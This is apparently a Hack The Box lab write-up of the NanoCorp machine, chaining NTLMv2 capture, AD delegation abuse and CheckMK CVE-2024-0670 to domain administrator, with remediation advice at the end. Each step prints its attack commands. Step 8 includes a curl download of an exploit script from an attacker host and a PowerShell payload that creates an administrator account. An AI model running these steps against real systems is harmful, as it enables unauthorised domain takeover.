---
title: "NanoCorp — NTLMv2 Capture, AD Delegation Abuse, and CheckMK MSI Repair Escalation"
seoTitle: "NanoCorp — NTLMv2 Capture and CheckMK MSI Repair Escalation"
description: "A zip-upload SSRF captures an NTLMv2 hash, and delegation abuse plus an MSI repair flaw create a domain administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ntlm-capture
  - responder
  - bloodhound
  - cve-2024-0670
  - checkmk
  - privilege-escalation
objective: "Escalate from an unauthenticated web upload to domain administrator via NTLMv2 capture, delegation abuse, and CVE-2024-0670."
tools:
  - rustscan
  - gobuster
  - Responder
  - hashcat
  - rusthound-ce
  - bloodyAD
  - NetExec
  - RunasCs
  - evil-winrm
skill: "Active Directory delegation-chain analysis and MSI repair privilege escalation"
outcome: "Domain administrator access via a created privileged domain account"
---

## At a glance

| Field | Value |
|---|---|
| Target environment | Windows Active Directory domain controller hosting a PHP web application |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an unauthenticated web upload to domain administrator via NTLMv2 capture, delegation abuse, and CVE-2024-0670 |
| Outcome | Domain administrator access via a newly created privileged domain account |

## ZIP upload to MSI repair escalation

NanoCorp is a Hack The Box Windows Active Directory lab that starts at an unauthenticated web application and ends with domain administrator access. A ZIP upload handler performs outbound connections while processing an archive, so a crafted ZIP triggers an SMB callback to `Responder`, which captures the `<WEB_SVC_ACCOUNT>` NTLMv2 challenge-response. The hash cracks against a common wordlist, and the recovered service-account credentials open the directory path: `<WEB_SVC_ACCOUNT>` holds `AddSelf` over the `<IT_SUPPORT_GROUP>` group, which holds `ForceChangePassword` over `<MONITORING_ACCOUNT>`. Adding `<WEB_SVC_ACCOUNT>` to the group and resetting `<MONITORING_ACCOUNT>`'s password yields WinRM access to the domain controller, where the CheckMK monitoring agent is affected by CVE-2024-0670; abusing the MSI repair as SYSTEM creates a new domain account with administrative rights. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **ZIP-upload SSRF → `Responder` NTLMv2 capture → offline crack of `<WEB_SVC_ACCOUNT>` → BloodHound `AddSelf`/`ForceChangePassword` path → `<MONITORING_ACCOUNT>` password reset → WinRM → CheckMK MSI repair (CVE-2024-0670) → domain administrator**

## AD controller with a PHP web upload, no credentials

- **Target:** Windows Active Directory domain controller hosting an Apache/PHP web application.
- **Exposed services:** DNS (53), HTTP (80), Kerberos (88), MSRPC (135), NetBIOS (139), LDAP (389/3268), SMB (445), WinRM (5986), and others.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** chain the exposed web upload, AD delegation, and a vulnerable monitoring agent into domain administrator access.
- **Constraints:** activity stayed inside the Hack The Box lab environment.

## Evidence: ZIP SSRF to delegation to MSI repair

### 1. Service Enumeration

Observation: a full TCP scan returns standard domain-controller services alongside an Apache web server.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

Truncated scan output:

```text
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Significance: DNS, Kerberos, LDAP, and SMB together identify a domain controller, and the Apache/PHP service on port 80 is the web attack surface.

Result: a Windows AD domain controller is exposed with an HTTP application.

### 2. Web Application Discovery

Observation: virtual-host enumeration reveals an additional site.

```bash
gobuster vhost --url http://<TARGET_HOST> --wordlist <SUBDOMAIN_WORDLIST> --append-domain
```

```text
<HIRE_SUBDOMAIN>
```

Significance: the discovered host runs an application with a ZIP upload feature; an archive extracted during upload could be steered into an outbound connection to the attacker.

Result: an upload-handling web application is discovered.

### 3. NTLMv2 Capture via Responder

Observation: a crafted ZIP submitted to the upload feature causes the server to open SMB to the attacker, where `Responder` captures the `<WEB_SVC_ACCOUNT>` NTLMv2 challenge-response.

```bash
responder -I <ATTACKER_INTERFACE>
```

```text
[SMB] NTLMv2-SSP Username : <DOMAIN>\<WEB_SVC_ACCOUNT>
[SMB] NTLMv2-SSP Hash     : <WEB_SVC_ACCOUNT>::<DOMAIN>:<CHALLENGE>:<RESPONSE>
```

Significance: the upload handler does not validate outbound connection targets, so server-side processing can be steered into authenticating to an attacker-controlled share. NTLMv2-SSP challenge-responses are crackable offline.

Result: an NTLMv2 challenge-response for the web service account is captured.

### 4. Offline Hash Cracking

Observation: the captured challenge-response cracks against a common wordlist.

```bash
hashcat -m 5600 <HASH_FILE> <WORDLIST> -D2
```

```text
<DOMAIN>\<WEB_SVC_ACCOUNT>:<CRACKED_PASSWORD>
```

Significance: a dictionary-foundable password on a service account means anyone who captures its challenge-response can authenticate to every service that account uses.

Result: a credential pair is recovered and subsequently validated through Active Directory authentication.

### 5. BloodHound Enumeration: AD Attack Path

Observation: with the recovered credentials, AD data collection exposes a two-hop delegation path.

```bash
rusthound-ce --domain <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' --zip -o <OUTPUT_DIR>
```

```text
<WEB_SVC_ACCOUNT> -> AddSelf -> <IT_SUPPORT_GROUP> -> ForceChangePassword -> <MONITORING_ACCOUNT>
<MONITORING_ACCOUNT> -> WinRM -> <DC_HOSTNAME>
```

Significance: `<WEB_SVC_ACCOUNT>` can add itself to `<IT_SUPPORT_GROUP>` through the `AddSelf` ACE, and `<IT_SUPPORT_GROUP>` holds `ForceChangePassword` over `<MONITORING_ACCOUNT>`, which has WinRM access to the domain controller. Neither hop requires administrator intervention.

Result: a two-hop escalation path from the service account to domain-controller access is identified, confirming the cracked credential authenticates.

### 6. AD Privilege Abuse: Group Membership and Password Reset

Observation: `<WEB_SVC_ACCOUNT>` exercises its `AddSelf` right, then the group's `ForceChangePassword` right.

```bash
bloodyAD -H <TARGET_IP> -d <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  add groupMember '<IT_SUPPORT_GROUP>' '<WEB_SVC_ACCOUNT>'
```

```text
[+] <WEB_SVC_ACCOUNT> added to <IT_SUPPORT_GROUP>
```

```bash
bloodyAD -H <TARGET_IP> -d <DOMAIN> -u '<WEB_SVC_ACCOUNT>' -p '<CRACKED_PASSWORD>' \
  set password '<MONITORING_ACCOUNT>' '<RESET_PASSWORD>'
```

```text
[+] Password changed successfully!
```

Significance: AD delegation lets the service account manage both the group and the target account without administrative involvement; that trust misconfiguration bridges the two hops.

Result: `<WEB_SVC_ACCOUNT>` is added to `<IT_SUPPORT_GROUP>`, and `<MONITORING_ACCOUNT>`'s password is reset.

### 7. WinRM Access via the Reset Account

Observation: the reset credential and a Kerberos ticket admit a WinRM session as `<MONITORING_ACCOUNT>`.

```bash
kinit <MONITORING_ACCOUNT>
evil-winrm -i <DC_HOSTNAME> -S -r <DOMAIN>
```

```text
<MONITORING_ACCOUNT>@<DOMAIN> PS>
```

Significance: WinRM gives a full PowerShell remoting session on the domain controller, but `<MONITORING_ACCOUNT>` is not a domain administrator, so local privilege escalation is still required.

Result: an authenticated, user-level PowerShell session on the domain controller.

### 8. CVE-2024-0670: CheckMK MSI Repair Privilege Escalation

Observation: the CheckMK monitoring agent's MSI repair flow executes batch scripts from the installer staging directory as SYSTEM.

Action: fetch the exploit script and run it in the `<WEB_SVC_ACCOUNT>` context with `RunasCs`; the script locates the CheckMK package in the registry, writes payload batch files matching the installer's expected naming convention, and forces a repair.

```bash
curl -o <EXPLOIT_SCRIPT> http://<ATTACKER_HOST>:<PORT>/<EXPLOIT_SCRIPT>
./RunasCs.exe '<WEB_SVC_ACCOUNT>' '<CRACKED_PASSWORD>' \
  'powershell -ExecutionPolicy Bypass -File <EXPLOIT_SCRIPT>'
```

Core actions the script performs:

```powershell
$BatchPayload = "@echo off`nnet user <NEW_ADMIN_ACCOUNT> <NEW_ADMIN_PASSWORD> /add /domain`nnet localgroup administrators <NEW_ADMIN_ACCOUNT> /add /domain"
...
Start-Process "msiexec.exe" -ArgumentList "/fa `"<MSI_PATH>`" /qn /l*vx <LOG_PATH>"
```

Significance: the repair reinstalls the package as SYSTEM and runs the staged batch files, so a low-privileged service-account process can create a new domain account and add it to the local Administrators group.

Result: the notes describe the repair as successful and the privileged domain account as created, but capture no repair-console output. I could not verify the repair directly; the next stage's authentication of the new account confirms execution.

### 9. Domain Administrator Access

Observation: For the created account, I checked the local group membership, which showed the Administrators group.

```bash
nxc smb <DOMAIN> -u '<NEW_ADMIN_ACCOUNT>' -p '<NEW_ADMIN_PASSWORD>' -k
```

```text
[+] <DOMAIN>\<NEW_ADMIN_ACCOUNT>:<NEW_ADMIN_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <DC_HOSTNAME> -u '<NEW_ADMIN_ACCOUNT>' -p '<NEW_ADMIN_PASSWORD>' -S
```

```text
BUILTIN\Administrators   Alias   S-1-5-32-544
```

Significance: the `Pwn3d!` marker and Administrators membership confirm the account has administrative rights over the domain controller and the domain.

Result: domain administrator access is obtained through the newly created account.

## Challenges and Decisions

No failed attempts, alternate approaches, or troubleshooting are recorded; the chain advanced in a single successful sequence.

## Outcome: domain administrator via a created account

The path reaches domain administrator access through misconfiguration, with no Windows vulnerability required: an upload handler that initiates outbound connections, a crackable service-account password, permissive AD delegation (`AddSelf` and `ForceChangePassword`), and an unpatched third-party monitoring agent whose MSI repair runs staged payloads as SYSTEM. The only CVE required was in the CheckMK agent (CVE-2024-0670); the operating system and directory services were used through their legitimate, misconfigured features. The final access level is supported by the `Pwn3d!` authentication result and the Administrators group membership.

## Recommendations: upload egress, service passwords, delegation, and the agent

The observed path points to these controls, whose effectiveness was not tested in this case.

1. **Upload handlers that initiate outbound connections.** The ZIP handler opened SMB to a supplied archive's target and leaked the service account's NTLMv2 challenge-response. *Recommendation:* block server-initiated SMB from web hosts, validate archive contents and outbound targets, and apply network egress filtering. *Detection:* detect web-server processes opening SMB to non-allowlisted hosts.
2. **Crackable service-account password.** A dictionary-foundable password made the captured challenge-response usable against the directory. *Recommendation:* move service identities to group Managed Service Accounts (gMSA) and enforce long, random passwords. *Detection:* audit service-account password strength and age on a schedule.
3. **Permissive AD delegation.** `AddSelf` on `<IT_SUPPORT_GROUP>` plus `ForceChangePassword` over `<MONITORING_ACCOUNT>` let a low-privileged account reset a peer account's password. *Recommendation:* remove unnecessary `AddSelf` and password-reset ACEs from service accounts and groups, and review delegation periodically. *Detection:* monitor group-membership and password-reset events driven by delegated rights.
4. **Unpatched third-party monitoring agent.** CVE-2024-0670 let the MSI repair run as SYSTEM and create a domain administrator. *Recommendation:* apply the vendor patch, or disable MSI repair for privileged installation packages. *Detection:* inventory third-party agents on domain controllers and track their versions.

## References

- [Hack The Box — NanoCorp](https://app.hackthebox.com/machines/NanoCorp) (retired machine)
- [NVD — CVE-2024-0670](https://nvd.nist.gov/vuln/detail/CVE-2024-0670) (CheckMK MSI repair privilege escalation)
- [Checkmk Werk #16361 — Privilege escalation in Windows agent](https://checkmk.com/werk/16361) (vendor advisory)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server used for NTLMv2 capture)
- [hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [RustScan](https://github.com/RustScan/RustScan) (port scanner)
- [Gobuster](https://github.com/OJ/gobuster) (virtual-host and content discovery)
- [BloodHound](https://github.com/SpecterOps/BloodHound) (Active Directory attack-path analysis)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (Active Directory data collector for BloodHound)
- [bloodyAD](https://github.com/cravaterouge/bloodyAD) (Active Directory object and privilege manipulation)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (network service authentication checks)
- [RunasCs](https://github.com/antonioCoco/RunasCs) (process execution under alternate Windows credentials)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM remote shell)
- [Group Managed Service Accounts overview — Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) (service-account password management)
- [msiexec command-line options — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/msi/command-line-options) (`/fa` repair behavior)
- [Control Access Rights — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/ad/control-access-rights) (extended rights and the Self-Membership validated write behind `AddSelf`)
- [User-Force-Change-Password extended right — Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password) (`ForceChangePassword` / `Reset Password` control access right)
